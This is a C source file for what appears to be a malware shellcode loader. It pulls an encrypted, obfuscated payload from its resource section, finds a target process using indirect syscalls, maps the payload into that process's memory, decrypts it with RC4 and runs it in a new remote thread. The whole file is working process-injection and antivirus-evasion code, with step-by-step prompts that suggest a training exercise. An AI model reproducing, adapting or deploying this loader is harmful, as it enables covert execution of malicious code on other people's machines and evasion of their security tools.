#include "Common.h"
#include "Resource.h"
#include "SysWhispers.h"
#include "EntropyReducer.h"

BOOL LoadPayloadFromResource(OUT PVOID* ppPayloadAddress, OUT SIZE_T* pPayloadSize)
{
	HRSRC		hRsrc = NULL;
	HGLOBAL		hGlobal = NULL;

	// Get the location to the data stored in .rsrc by its id *IDR_RCDATA1*
	hRsrc = g_Api.pFindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
	if (hRsrc == NULL) {
		// in case of function failure 
		PRINTA("[!] FindResourceW Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Get HGLOBAL, or the handle of the specified resource data since its required to call LockResource later
	hGlobal = g_Api.pLoadResource(NULL, hRsrc);
	if (hGlobal == NULL) {
		// in case of function failure 
		PRINTA("[!] LoadResource Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Get the address of our payload in .rsrc section
	*ppPayloadAddress = g_Api.pLockResource(hGlobal);
	if (*ppPayloadAddress == NULL) {
		// in case of function failure 
		PRINTA("[!] LockResource Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Get the size of our payload in .rsrc section
	*pPayloadSize = g_Api.pSizeofResource(NULL, hRsrc);
	if (*pPayloadSize == 0) {
		// in case of function failure 
		PRINTA("[!] SizeofResource Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* phProcess)
{
	ULONG							uReturnLen1 = 0;
	ULONG							uReturnLen2 = 0;
	PSYSTEM_PROCESS_INFORMATION		SystemProcInfo = NULL;
	NTSTATUS						status = 0;

	// First NtQuerySystemInformation call
	// This will fail with STATUS_INFO_LENGTH_MISMATCH
	// But it will provide information about how much memory to allocate (uReturnLen1)
	WhisperHell(g_SyscallsTable.NtQuerySystemInformation.wSystemCall);
	NtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &uReturnLen1);

	// Allocating enough buffer for the returned array of `SYSTEM_PROCESS_INFORMATION` struct
	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, uReturnLen1);
	if (SystemProcInfo == NULL) {
		PRINTA("[!] HeapAlloc Failed With Error :  0x%0.8X\n", GetLastError());
		return FALSE;
	}

	// Second NtQuerySystemInformation call
	// Calling NtQuerySystemInformation with the correct arguments, the output will be saved to 'SystemProcInfo'
	WhisperHell(g_SyscallsTable.NtQuerySystemInformation.wSystemCall);
	if ((status = NtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2) != 0x0)) {
		PRINTA("[!] HellDescent Failed With Error :  0x%0.8X\n", status);
		return FALSE;
	}
	PRINTA("[+] Retrieved SystemProcInfo Structure At %p with Actual Retrieved Size: %d\n", SystemProcInfo, uReturnLen2);

	// Since we will modify 'SystemProcInfo', we will save its initial value before the while loop to free it later
	PSYSTEM_PROCESS_INFORMATION pValueToFree = SystemProcInfo;

	// 'SystemProcInfo' will now represent a new element in the array
	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);

	while (TRUE) {
		// Small check for the process's name size
		// Comparing the enumerated process name to what we want to target
		if (SystemProcInfo->ImageName.Length && IsStringEqual(szProcName, SystemProcInfo->ImageName.Buffer) == TRUE) {
			*pdwPid = (DWORD)SystemProcInfo->UniqueProcessId;
			*phProcess = g_Api.pOpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
			break;
		}

		// If NextEntryOffset is 0, we reached the end of the array
		if (SystemProcInfo->NextEntryOffset == 0)
			break;

		// Move to the next element in the array
		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
	}

	HeapFree(GetProcessHeap(), 0, pValueToFree);

	// Check if we successfully got the target process handle
	if (*pdwPid == 0 || *phProcess == NULL)
		return FALSE;
	else
		return TRUE;
}

BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize, IN BOOL bIsLocalInjection) {
	// Init local vars
	NTSTATUS		status = 0x0;
	HANDLE          hSection = NULL, hThread = NULL;
	PVOID			pAllocatedAddress = NULL;
	PVOID			pAllocatedRemoteAddress = NULL;
	PVOID			pExecAddress = NULL;
	LARGE_INTEGER	liMaxSize = { .LowPart = (DWORD)sPayloadSize };
	SIZE_T          sViewSize = 0;
	DWORD           dwLocalFlag = bIsLocalInjection ? PAGE_EXECUTE_READWRITE : PAGE_READWRITE;

	// Allocating local map view
	WhisperHell(g_SyscallsTable.NtCreateSection.wSystemCall);
	if ((status = NtCreateSection(
		&hSection,
		SECTION_ALL_ACCESS,
		NULL,
		&liMaxSize,
		PAGE_EXECUTE_READWRITE,
		SEC_COMMIT,
		NULL
	)) != 0) {
		PRINTA("[!] NtCreateSection Failed With Error : 0x%0.8X \n", status);
		return FALSE;
	}
	WhisperHell(g_SyscallsTable.NtMapViewOfSection.wSystemCall);
	if ((status = NtMapViewOfSection(
		hSection,
		GetCurrentProcessHandle(),
		&pAllocatedAddress,
		NULL, NULL, NULL,
		&sViewSize,
		ViewShare,
		NULL,
		dwLocalFlag
	)) != 0) {
		PRINTA("[!] NtMapViewOfSection [R] Failed With Error : 0x%0.8X \n", status);
		return FALSE;
	}

	PRINTA("[+] Local Memory Allocated At : 0x%p Of Size : %d \n", pAllocatedAddress, (INT)sViewSize);

	// Writing the payload
	PRINTA("[#] Press <Enter> To Write The Payload ... ");
	GETCHAR();

	CopyMemoryEx(pAllocatedAddress, pPayload, sPayloadSize);
	PRINTA("\t[+] Payload is Copied From 0x%p To 0x%p \n", pPayload, pAllocatedAddress);

	// Allocating remote map view 
	if (!bIsLocalInjection) {
		WhisperHell(g_SyscallsTable.NtMapViewOfSection.wSystemCall);
		if ((status = NtMapViewOfSection(
			hSection,
			hProcess,
			&pAllocatedRemoteAddress,
			NULL, NULL, NULL,
			&sViewSize,
			ViewShare,
			NULL,
			PAGE_EXECUTE_READWRITE
		)) != 0x0) {
			PRINTA("[!] NtMapViewOfSection [R] Failed With Error : 0x%0.8X \n", status);
			return FALSE;
		}
		PRINTA("[+] Remote Memory Allocated At : 0x%p Of Size : %d \n", pAllocatedRemoteAddress, (INT)sViewSize);
	}

	// Deobfuscating the payload
	PRINTA("[#] Press <Enter> To Deobfuscate The Payload ... ");
	GETCHAR();
	SIZE_T	DeobfuscatedPayloadSize = NULL;
	PBYTE	DeobfuscatedPayloadBuffer = NULL;

	PRINTA("[i] Deobfuscating\" ... ");
	if (!Deobfuscate(pAllocatedAddress, sPayloadSize, &DeobfuscatedPayloadBuffer, &DeobfuscatedPayloadSize)) {
		return -1;
	}
	PRINTA("[+] DONE \n");
	PRINTA("\t>>> Deobfuscated Payload Size : %ld \n\t>>> Deobfuscated Payload Located At : 0x%p \n", DeobfuscatedPayloadSize, DeobfuscatedPayloadBuffer);

	// Copying the deobfuscated payload to the allocated address
	PRINTA("[#] Press <Enter> To Copy The Deobfuscated Payload ... ");
	GETCHAR();
	CopyMemoryEx(pAllocatedAddress, DeobfuscatedPayloadBuffer, DeobfuscatedPayloadSize);

	// Decrypting the payload
	PRINTA("[#] Press <Enter> To Decrypt The Payload ... ");
	GETCHAR();

	Rc4DecryptionViSystemFunc032(ProtectedKey, pAllocatedAddress, KEY_SIZE, sPayloadSize);

	// Executing the payload via thread creation
	pExecAddress = pAllocatedAddress;
	if (!bIsLocalInjection) {
		pExecAddress = pAllocatedRemoteAddress;
	}

	PRINTA("[#] Press <Enter> To Run The Payload ... ");
	GETCHAR();

	PRINTA("\t[i] Running Thread Of Entry 0x%p ... ", pExecAddress);
	WhisperHell(g_SyscallsTable.NtCreateThreadEx.wSystemCall);
	if ((status = NtCreateThreadEx(
		&hThread,
		THREAD_ALL_ACCESS,
		NULL,
		hProcess,
		pExecAddress,
		NULL,
		NULL,
		NULL, NULL, NULL,
		NULL
	)) != 0x0) {
		PRINTA("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", status);
		return FALSE;
	}
	PRINTA("[+] DONE \n");
	if (hThread != 0x0) {
		PRINTA("\t[+] Thread Created With Id : %d \n", GetThreadId(hThread));
	}

	// Waiting for the thread to finish
	WhisperHell(g_SyscallsTable.NtWaitForSingleObject.wSystemCall);
	if ((status = NtWaitForSingleObject(
		hThread,
		FALSE,
		NULL
	)) != 0x0) {
		PRINTA("[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n", status);
		return FALSE;
	}

	// Unmapping the local view
	WhisperHell(g_SyscallsTable.NtUnmapViewOfSection.wSystemCall);
	if ((status = NtUnmapViewOfSection(
		hProcess,
		pAllocatedAddress
	)) != 0x0) {
		PRINTA("[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n", status);
		return FALSE;
	}

	// Closing the section handle
	WhisperHell(g_SyscallsTable.NtClose.wSystemCall);
	if ((status = NtClose(
		hSection
	)) != 0x0) {
		PRINTA("[!] NtClose Failed With Error : 0x%0.8X \n", status);
		return FALSE;
	}

	return TRUE;
}